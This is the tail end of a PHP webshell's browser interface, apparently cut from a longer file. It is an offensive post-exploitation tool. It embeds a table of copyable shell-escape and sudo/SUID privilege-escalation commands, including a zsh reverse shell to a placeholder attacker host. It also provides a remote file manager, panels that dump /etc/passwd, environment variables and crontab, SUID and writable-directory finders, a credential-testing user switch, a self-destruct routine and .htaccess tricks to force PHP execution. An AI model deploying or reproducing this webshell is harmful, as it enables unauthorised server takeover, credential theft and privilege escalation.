{name:'rsync',cats:{shell:'rsync -e \'/bin/sh -c "/bin/sh 0<&2 1>&2"\' x:x',sudo:'sudo rsync -e \'/bin/sh -c "/bin/sh 0<&2 1>&2"\' x:x'}},
{name:'scp',cats:{shell:'scp -o \'ProxyCommand=;/bin/sh 0<&2 1>&2\' x x:'}},
{name:'ftp',cats:{shell:'ftp\n!/bin/sh'}},
{name:'apt-get',cats:{shell:'apt-get update -o APT::Update::Pre-Invoke::=/bin/sh',sudo:'sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh'}},
{name:'pip',cats:{shell:'pip config --editor \'/bin/sh -s\' edit',sudo:'sudo pip config --editor \'/bin/sh -s\' edit'}},
{name:'npm',cats:{shell:'npm exec /bin/sh',sudo:'sudo npm exec /bin/sh'}},
{name:'systemctl',cats:{shell:'systemctl\n!/bin/sh',sudo:'sudo systemctl\n!/bin/sh'}},
{name:'nice',cats:{shell:'nice /bin/sh',suid:'nice /bin/sh -p',sudo:'sudo nice /bin/sh'}},
{name:'ionice',cats:{shell:'ionice /bin/sh',sudo:'sudo ionice /bin/sh'}},
{name:'timeout',cats:{shell:'timeout 0 /bin/sh',sudo:'sudo timeout 0 /bin/sh'}},
{name:'stdbuf',cats:{shell:'stdbuf -i0 /bin/sh',suid:'stdbuf -i0 /bin/sh -p',sudo:'sudo stdbuf -i0 /bin/sh'}},
{name:'flock',cats:{shell:'flock -u / /bin/sh',suid:'flock -u / /bin/sh -p',sudo:'sudo flock -u / /bin/sh'}},
{name:'xargs',cats:{shell:'xargs -a /dev/null /bin/sh',sudo:'sudo xargs -a /dev/null /bin/sh'}},
{name:'chmod',cats:{suid:'sudo chmod 6777 /path/to/binary'}},
{name:'chown',cats:{sudo:'sudo chown $(id -un):$(id -gn) /path/to/file'}},
{name:'script',cats:{shell:'script -q /dev/null',sudo:'sudo script -q /dev/null'}},
{name:'rlwrap',cats:{shell:'rlwrap /bin/sh',sudo:'sudo rlwrap /bin/sh'}},
{name:'zsh',cats:{shell:'zsh',sudo:'sudo zsh','file-read':'zsh -c \'echo "$(</path/to/file)"\'','reverse-shell':'zsh -c \'zmodload zsh/net/tcp;ztcp ATTACKER PORT;zsh >&$REPLY 2>&$REPLY 0>&$REPLY\''}},
{name:'service',cats:{sudo:'sudo service ../../bin/sh'}},
{name:'at',cats:{shell:'echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | at now; tail -f /dev/null'}},
{name:'rpm',cats:{shell:'rpm --eval \'%(/bin/sh 1>&2)\'',sudo:'sudo rpm --eval \'%(/bin/sh 1>&2)\''}},
];

const CAT_COLORS = {shell:'green',suid:'red',sudo:'orange',capabilities:'purple','file-read':'cyan','file-write':'pink','reverse-shell':'blue'};

function filterGtfo() { renderGtfoGrid(); }
function setGtfoFilter(cat, el) {
    activeGtfoFilter = cat;
    document.querySelectorAll('.gtfo-filter').forEach(b => b.classList.remove('active'));
    el.classList.add('active');
    expandedGtfo = null;
    renderGtfoGrid();
}
function renderGtfoGrid() {
    const search = ($('gtfo-search').value || '').toLowerCase();
    const grid = $('gtfo-grid');
    const filtered = GTFO.filter(b => {
        if (search && !b.name.includes(search)) return false;
        if (activeGtfoFilter !== 'all' && !b.cats[activeGtfoFilter]) return false;
        return true;
    });
    grid.innerHTML = filtered.map(b => {
        const isExp = expandedGtfo === b.name;
        const cats = Object.keys(b.cats);
        let html = `<div class="gtfo-card${isExp ? ' expanded' : ''}" onclick="${isExp ? '' : `expandGtfo('${b.name}')`}">
            <div class="bin-name">${esc(b.name)}</div>
            <div class="badges">${cats.map(c => `<span class="badge badge-${CAT_COLORS[c] || 'blue'}">${c}</span>`).join('')}</div>`;
        if (isExp) {
            html += '<div class="gtfo-detail">';
            for (const [cat, cmd] of Object.entries(b.cats)) {
                html += `<h4><span class="badge badge-${CAT_COLORS[cat] || 'blue'}">${cat}</span></h4>
                    <div class="code-box" style="margin-bottom:8px"><button class="copy-btn btn btn-sm" onclick="event.stopPropagation();copyText(this.parentElement.textContent.replace('Copy','').trim())">Copy</button>${esc(cmd)}</div>`;
            }
            html += '<button class="btn btn-sm" style="margin-top:8px" onclick="event.stopPropagation();expandedGtfo=null;renderGtfoGrid();">Collapse</button></div>';
        }
        html += '</div>';
        return html;
    }).join('');
}
function expandGtfo(name) { expandedGtfo = name; renderGtfoGrid(); }
renderGtfoGrid();

// ===== FILE MANAGER =====
async function loadFileManager(path) {
    const data = await apiJson({action:'filemanager', path: path || CWD});
    if (data.error) { toast(data.error, 'error'); return; }
    fmCurrentPath = data.path;
    // Breadcrumb
    const parts = data.path.split('/').filter(Boolean);
    let bc = '<span onclick="loadFileManager(\'/\')">/</span>';
    let accumulated = '';
    for (const p of parts) {
        accumulated += '/' + p;
        const accCopy = accumulated;
        bc += ' / <span onclick="loadFileManager(\'' + esc(accCopy) + '\')">' + esc(p) + '</span>';
    }
    $('fm-breadcrumb').innerHTML = bc;
    // Table
    const tbody = $('fm-tbody');
    tbody.innerHTML = data.items.sort((a,b) => {
        if (a.name === '..') return -1; if (b.name === '..') return 1;
        if (a.is_dir && !b.is_dir) return -1; if (!a.is_dir && b.is_dir) return 1;
        return a.name.localeCompare(b.name);
    }).map(f => {
        const icon = f.is_dir ? '<span class="dir-icon">&#128193;</span>' : '<span class="file-icon">&#128196;</span>';
        return `<tr>
            <td><div class="fname" onclick="${f.is_dir ? `loadFileManager('${esc(f.path)}')` : `fmViewFile('${esc(f.path)}')`}">${icon} ${esc(f.name)}</div></td>
            <td style="color:var(--text-secondary);font-size:12px">${f.is_dir ? '-' : formatBytes(f.size)}</td>
            <td style="font-family:var(--font-mono);font-size:12px;color:${f.writable ? 'var(--green)' : 'var(--text-secondary)'}">${f.perms}</td>
            <td style="color:var(--text-secondary);font-size:12px">${f.mtime}</td>
            <td><div class="fm-actions">${f.name !== '..' ? `
                <button class="btn btn-sm" onclick="fmDownload('${esc(f.path)}')">DL</button>
                <button class="btn btn-sm" onclick="fmRename('${esc(f.path)}','${esc(f.name)}')">Ren</button>
                <button class="btn btn-sm btn-danger" onclick="fmDelete('${esc(f.path)}','${esc(f.name)}')">Del</button>
                ${!f.is_dir ? `<button class="btn btn-sm" onclick="fmEdit('${esc(f.path)}')">Edit</button>` : ''}
            ` : ''}</div></td>
        </tr>`;
    }).join('');
}
function fmDownload(path) { window.open('?download=' + encodeURIComponent(path), '_blank'); }
async function fmDelete(path, name) { if (!confirm('Delete ' + name + '?')) return; await apiJson({action:'fileaction',type:'delete',path}); loadFileManager(fmCurrentPath); }
async function fmRename(path, name) { const n = prompt('New name:', name); if (!n) return; await apiJson({action:'fileaction',type:'rename',path,newname:n}); loadFileManager(fmCurrentPath); }
async function fmMkdir() { const n = prompt('Folder name:'); if (!n) return; await apiJson({action:'fileaction',type:'mkdir',path:fmCurrentPath+'/'+n}); loadFileManager(fmCurrentPath); }
async function fmEdit(path) {
    const data = await apiJson({action:'fileaction',type:'read',path});
    if (!data.ok) { toast(data.msg || 'Cannot read file', 'error'); return; }
    editingFile = path;
    $('edit-modal-title').textContent = 'Edit: ' + data.name;
    $('edit-content').value = data.content;
    $('edit-modal').classList.add('show');
}
async function fmViewFile(path) { fmEdit(path); }
function closeEditModal() { $('edit-modal').classList.remove('show'); }
async function saveEdit() {
    await apiJson({action:'fileaction',type:'write',path:editingFile,content:$('edit-content').value});
    closeEditModal(); toast('File saved!'); loadFileManager(fmCurrentPath);
}
async function fmUpload(file) {
    if (!file) return;
    const fd = new FormData();
    fd.append('upload', file);
    fd.append('upload_path', fmCurrentPath);
    const r = await fetch(window.location.href, {method:'POST', body:fd});
    const data = await r.json();
    if (data.ok) { toast('Uploaded: ' + data.name); loadFileManager(fmCurrentPath); }
    else toast('Upload failed', 'error');
}

// ===== SYSTEM INFO =====
async function loadSysinfo() {
    $('sysinfo-body').innerHTML = '<p style="color:var(--text-secondary)">Loading...</p>';
    const data = await apiJson({action:'sysinfo'});
    $('sysinfo-body').innerHTML = `
        <div class="grid-2" style="margin-bottom:20px">
            <div class="info-card"><div class="label">OS</div><div class="value">${esc(data.os)}</div></div>
            <div class="info-card"><div class="label">Kernel</div><div class="value">${esc(data.kernel)}</div></div>
            <div class="info-card"><div class="label">Hostname</div><div class="value">${esc(data.hostname)}</div></div>
            <div class="info-card"><div class="label">User</div><div class="value">${esc(data.user)}</div></div>
            <div class="info-card"><div class="label">ID</div><div class="value">${esc(data.uid)}</div></div>
            <div class="info-card"><div class="label">Groups</div><div class="value">${esc(data.groups)}</div></div>
            <div class="info-card"><div class="label">IP Addresses</div><div class="value">${esc(data.ip_addrs)}</div></div>
            <div class="info-card"><div class="label">Uptime</div><div class="value">${esc(data.uptime)}</div></div>
            <div class="info-card"><div class="label">PHP</div><div class="value">${esc(data.php_ver)}</div></div>
            <div class="info-card"><div class="label">Server</div><div class="value">${esc(data.server_software)}</div></div>
        </div>
        <details class="card" style="margin-bottom:12px"><summary style="cursor:pointer;font-weight:600;padding:4px 0">Network Interfaces</summary><div class="code-box" style="margin-top:10px">${esc(data.interfaces)}</div></details>
        <details class="card" style="margin-bottom:12px"><summary style="cursor:pointer;font-weight:600;padding:4px 0">Disk Usage</summary><div class="code-box" style="margin-top:10px">${esc(data.disk)}</div></details>
        <details class="card" style="margin-bottom:12px"><summary style="cursor:pointer;font-weight:600;padding:4px 0">Processes (top 30 by memory)</summary><div class="code-box" style="margin-top:10px">${esc(data.processes)}</div></details>
        <details class="card" style="margin-bottom:12px"><summary style="cursor:pointer;font-weight:600;padding:4px 0">Environment Variables</summary><div class="code-box" style="margin-top:10px">${esc(data.env)}</div></details>
        <details class="card" style="margin-bottom:12px"><summary style="cursor:pointer;font-weight:600;padding:4px 0">Crontab</summary><div class="code-box" style="margin-top:10px">${esc(data.crontab || 'No crontab found')}</div></details>
        <details class="card" style="margin-bottom:12px"><summary style="cursor:pointer;font-weight:600;padding:4px 0">/etc/passwd</summary><div class="code-box" style="margin-top:10px">${esc(data.passwd || 'Cannot read')}</div></details>
        <details class="card" style="margin-bottom:12px"><summary style="cursor:pointer;font-weight:600;padding:4px 0">Disabled PHP Functions</summary><div class="code-box" style="margin-top:10px">${esc(data.php_disabled || 'None')}</div></details>
    `;
}
async function findSuid() {
    const data = await apiJson({action:'find_suid'});
    const body = $('sysinfo-body');
    body.innerHTML = '<h3 style="margin-bottom:12px">SUID Binaries</h3><div class="code-box">' + esc(data.result || 'None found') + '</div><br><button class="btn" onclick="loadSysinfo()">Back to System Info</button>';
}
async function findWritable() {
    const data = await apiJson({action:'find_writable'});
    const body = $('sysinfo-body');
    body.innerHTML = '<h3 style="margin-bottom:12px">Writable Directories</h3><div class="code-box">' + esc(data.result || 'None found') + '</div><br><button class="btn" onclick="loadSysinfo()">Back to System Info</button>';
}

// ===== NETWORK TOOLS =====
async function runNet(tool) {
    const target = $('net-target').value;
    $('net-output').textContent = 'Running ' + tool + '...';
    const data = await apiJson({action:'nettool', tool, target});
    $('net-output').textContent = data.result || 'No output';
}

// ===== USER SWITCH =====
async function doSwitchUser() {
    var user = $('su-username').value.trim();
    var pass = $('su-password').value;
    var status = $('su-status');
    if (!user) { status.textContent = 'Enter a username.'; status.style.color = 'var(--red)'; return; }
    status.textContent = 'Testing credentials...'; status.style.color = 'var(--text-secondary)';
    try {
        var data = await apiJson({action:'switch_user', su_user:user, su_pass:pass});
        if (data.ok) {
            status.textContent = 'Switched to ' + data.user; status.style.color = 'var(--green)';
            $('su-current').textContent = data.user;
            suUser = data.user;
            updateInputPrompt();
            termWriteLine('<span style="color:#3fb950">Switched to user: ' + esc(data.user) + '</span>');
        } else {
            status.textContent = data.msg || 'Failed'; status.style.color = 'var(--red)';
        }
    } catch(e) { status.textContent = 'Error: ' + e.message; status.style.color = 'var(--red)'; }
}
async function doResetUser() {
    var status = $('su-status');
    status.textContent = 'Resetting...'; status.style.color = 'var(--text-secondary)';
    try {
        var data = await apiJson({action:'switch_user', su_user:'', su_pass:''});
        if (data.ok) {
            status.textContent = 'Back to ' + data.user; status.style.color = 'var(--green)';
            $('su-current').textContent = data.user;
            suUser = '';
            updateInputPrompt();
            $('su-username').value = ''; $('su-password').value = '';
            termWriteLine('<span style="color:#3fb950">Switched back to default user: ' + esc(data.user) + '</span>');
        } else {
            status.textContent = data.msg || 'Failed'; status.style.color = 'var(--red)';
        }
    } catch(e) { status.textContent = 'Error: ' + e.message; status.style.color = 'var(--red)'; }
}

// ===== SETTINGS =====
async function selfDestruct() {
    if (!confirm('DANGER: This will permanently delete this webshell! Are you sure?')) return;
    const mins = $('sd-minutes').value;
    const data = await apiJson({action:'self_destruct', minutes: mins});
    toast(data.msg, data.ok ? 'success' : 'error');
}

// Clock
function updateClock() {
    const now = new Date();
    const el = $('clock');
    if (el) el.textContent = now.toLocaleTimeString('en-GB', {hour:'2-digit',minute:'2-digit',second:'2-digit'});
}
updateClock(); setInterval(updateClock, 1000);

(function() {
    var el = $('env-terminal-mode');
    if (el) el.textContent = 'Inline terminal (standalone)';
})();

// Update topbar path when CWD changes
const origGetPrompt = getPrompt;
const _origCWD = Object.getOwnPropertyDescriptor(window, 'CWD') || {};
let _cwd = CWD;
Object.defineProperty(window, 'CWD', {
    get() { return _cwd; },
    set(v) { _cwd = v; const p = $('tb-path'); if (p) p.textContent = v; }
});
CWD = _cwd;

// GTFOBins: add data attributes for colored left borders
function addGtfoDataAttrs() {
    document.querySelectorAll('.gtfo-card').forEach(card => {
        const badges = card.querySelector('.badges');
        if (!badges) return;
        const text = badges.textContent;
        if (text.includes('reverse-shell')) card.setAttribute('data-has-revshell','');
        else if (text.includes('suid')) card.setAttribute('data-has-suid','');
        else if (text.includes('sudo')) card.setAttribute('data-has-sudo','');
    });
}
const _origRenderGtfo = renderGtfoGrid;
renderGtfoGrid = function() { _origRenderGtfo(); addGtfoDataAttrs(); };
renderGtfoGrid();

// Update environment info card
var envTermEl = $('env-terminal-mode');
if (envTermEl) envTermEl.textContent = 'Inline terminal (standalone)';
</script>

<!-- PHP detection for main app -->
<span id="php-check-main" style="display:none"><?php echo 'PHP_OK'; ?></span>
<script>
(function(){
    var c = document.getElementById('php-check-main');
    if (!c || c.textContent.trim() !== 'PHP_OK') {
        document.body.innerHTML = '<div style="position:fixed;inset:0;background:rgba(0,0,0,0.9);display:flex;align-items:center;justify-content:center;z-index:99999"><div style="background:#161b22;border:1px solid rgba(248,81,73,0.3);border-radius:16px;padding:32px;max-width:520px;text-align:center"><h2 style="color:#f85149;margin-bottom:12px">PHP Not Executing</h2><p style="color:#8b949e;font-size:14px;margin-bottom:16px">This file is being served as plain text. PHP is not processing it.</p><p style="color:#d29922;font-size:13px;margin-bottom:12px;font-weight:600">Create a .htaccess file in the same directory with:</p><code style="display:block;background:#0d1117;padding:12px;margin:8px 0;border-radius:8px;font-size:12px;text-align:left;color:#e6edf3;white-space:pre;overflow-x:auto">AddHandler application/x-httpd-php .php\nAddType application/x-httpd-php .php .phtml\n&lt;FilesMatch "\\.php$"&gt;\n  SetHandler application/x-httpd-php\n&lt;/FilesMatch&gt;</code><p style="color:#8b949e;font-size:12px;margin-top:8px">If that doesn\'t work, try CGI mode:</p><code style="display:block;background:#0d1117;padding:8px;margin:4px 0;border-radius:6px;font-size:12px;text-align:left;color:#e6edf3">Options +ExecCGI\nAddHandler cgi-script .php</code></div></div>';
    }
})();
</script>
</body></html>
